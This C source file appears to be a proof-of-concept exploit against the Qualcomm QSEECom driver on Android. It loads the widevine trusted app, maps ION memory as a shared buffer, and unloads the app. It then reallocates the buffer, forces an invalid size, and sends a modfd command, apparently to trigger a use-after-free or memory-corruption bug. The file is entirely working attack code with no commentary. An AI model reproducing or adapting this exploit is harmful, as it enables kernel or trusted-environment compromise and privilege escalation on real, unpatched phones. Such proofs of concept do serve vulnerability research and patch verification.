#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include "ion.h"
#include "msm_ion.h"
#include "qseecom.h"
#include "QSEEComAPI.h"

#define QSEE_APP "widevine"
#define ION_SIZE (0x1000)
#define ION_HEAP_ID (19)

typedef struct {
    int dev_fd;
    ion_user_handle_t handle;
    int map_fd;
    void *map;
    size_t size;
} ion_data_t;

// Free data from ion_memalloc
static void ion_memfree(ion_data_t *ion_data) {
    struct ion_handle_data handle_data = { .handle = ion_data->handle };

    if (MAP_FAILED != ion_data->map) {
        munmap(ion_data->map, ion_data->size);
        ion_data->map = MAP_FAILED;
    }

    if (-1 != ion_data->map_fd) {
        close(ion_data->map_fd);
        ion_data->map_fd = -1;
    }

    if (0 != ion_data->handle) {
        ioctl(ion_data->dev_fd, ION_IOC_FREE, &handle_data);
        ion_data->handle = 0;
    }

    if (-1 != ion_data->dev_fd) {
        close(ion_data->dev_fd);
        ion_data->dev_fd = -1;
    }
}

// Allocate and map an ION mapping
// Should be freed using ion_memfree
static int ion_memalloc(size_t size, int heap_id, ion_data_t *ion_data) {
    int result = 0;
    struct ion_allocation_data alloc_data = { .align = 0x1000, .len = size,
        .heap_id_mask = ION_HEAP(heap_id), .flags = 0, .handle = 0 };
    struct ion_fd_data fd_data = {0};

    ion_data->dev_fd = -1;
    ion_data->handle = 0;
    ion_data->map_fd = -1;
    ion_data->map = MAP_FAILED;
    ion_data->size = size;

    ion_data->dev_fd = open("/dev/ion", O_RDONLY);
    if (-1 == ion_data->dev_fd) {
        result = 1;
        goto cleanup;
    }

    if (0 != ioctl(ion_data->dev_fd, ION_IOC_ALLOC, &alloc_data)) {
        result = 2;
        goto cleanup;
    }
    ion_data->handle = alloc_data.handle;

    fd_data.handle = alloc_data.handle;
    if (0 != ioctl(ion_data->dev_fd, ION_IOC_MAP, &fd_data)) {
        result = 3;
        goto cleanup;
    }
    ion_data->map_fd = fd_data.fd;

    ion_data->map = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
            ion_data->map_fd, 0);
    if (MAP_FAILED == ion_data->map) {
        result = 4;
        goto cleanup;
    }

cleanup:
    if (0 != result) {
        ion_memfree(ion_data);
    }
    return result;
}

static int set_sb_mem_param(int qseecom_fd, const ion_data_t *ion_data,
        size_t size) {
    struct qseecom_set_sb_mem_param_req req = {
        .ifd_data_fd = ion_data->map_fd, .virt_sb_base = ion_data->map,
        .sb_len = size };
    return ioctl(qseecom_fd, QSEECOM_IOCTL_SET_MEM_PARAM_REQ, &req);
}

static int start_app(int qseecom_fd, const char *firmware_path,
        const char *app_name, uint32_t *app_id) {
    // QSEEComAPI is useful as it has all the code to load .mdt and .b** files
    // as an app. Unfortunately it also immediately attaches an ION buffer to
    // it. In order to have our qseecom_fd linked to an app without linking it
    // to an ION buffer, we use QSEEComAPI to start the app, query through our
    // own qseecom fd for that app which links to it and then shut down
    // QSEEComAPI.

    int result = 0;
    struct QSEECom_handle *handle = NULL;
    struct qseecom_qseos_app_load_query load_query = {0};

    result = QSEECom_start_app(&handle, firmware_path, app_name, ION_SIZE);
    if (0 != result) {
        goto cleanup;
    }

    strlcpy(load_query.app_name, app_name, MAX_APP_NAME_SIZE);
    if (0 == ioctl(qseecom_fd, QSEECOM_IOCTL_APP_LOADED_QUERY_REQ,
                &load_query) || EEXIST != errno) {
        result = 1;
        goto cleanup;
    }
    *app_id = load_query.app_id;

cleanup:
    if (NULL != handle) {
        QSEECom_shutdown_app(&handle);
    }
    return result;
}

static int send_modfd_cmd(int qseecom_fd, const ion_data_t *ion_data) {
    struct qseecom_send_modfd_cmd_req req = { .cmd_req_buf = ion_data->map,
        .cmd_req_len = 0x10, .resp_buf = (char *)ion_data->map + 0x10,
        .resp_len = 0x10 };
    req.ifd_data[0].fd = ion_data->map_fd;
    req.ifd_data[0].cmd_buf_offset = 0;
    return ioctl(qseecom_fd, QSEECOM_IOCTL_SEND_MODFD_CMD_64_REQ, &req);
}

int main(void) {
    int result = 0;
    ion_data_t ion_data = {0};
    int qseecom_fd = -1;
    uint32_t app_id = 0;

    qseecom_fd = open("/dev/qseecom", O_RDWR);
    if (-1 == qseecom_fd) {
        result = 1;
        perror("Failed opening /dev/qseecom: ");
        goto cleanup;
    }

    result = start_app(qseecom_fd, "/vendor/firmware", QSEE_APP, &app_id);
    if (0 != result) {
        fprintf(stderr, "start_app failed, ret = %d, ", result);
        perror(NULL);
        goto cleanup;
    }
    printf("Loaded app, id = %d\n", app_id);

    result = ion_memalloc(ION_SIZE, ION_HEAP_ID, &ion_data);
    if (0 != result) {
        fprintf(stderr, "ion_memalloc failed, ret = %d, ", result);
        perror(NULL);
        goto cleanup;
    }

    result = set_sb_mem_param(qseecom_fd, &ion_data, ION_SIZE);
    if (0 != result) {
        perror("set_sb_mem_param failed: ");
        goto cleanup;
    }

    result = ioctl(qseecom_fd, QSEECOM_IOCTL_UNLOAD_APP_REQ);
    if (0 != result) {
        perror("unload_app failed: ");
        goto cleanup;
    }

    ion_memfree(&ion_data);
    result = ion_memalloc(ION_SIZE, ION_HEAP_ID, &ion_data);
    if (0 != result) {
        fprintf(stderr, "ion_memalloc #2 failed, ret = %d, ", result);
        perror(NULL);
        goto cleanup;
    }

    result = set_sb_mem_param(qseecom_fd, &ion_data, ION_SIZE + 0x1000);
    if (0 == result || EINVAL != errno) {
        perror("set_sb_mem_param #2 result unexpected: ");
        goto cleanup;
    }

    result = send_modfd_cmd(qseecom_fd, &ion_data);
    if (0 != result) {
        perror("send_modfd_cmd failed: ");
        goto cleanup;
    }

cleanup:
    if (-1 != qseecom_fd) {
        close(qseecom_fd);
    }
    ion_memfree(&ion_data);
    return result;
}
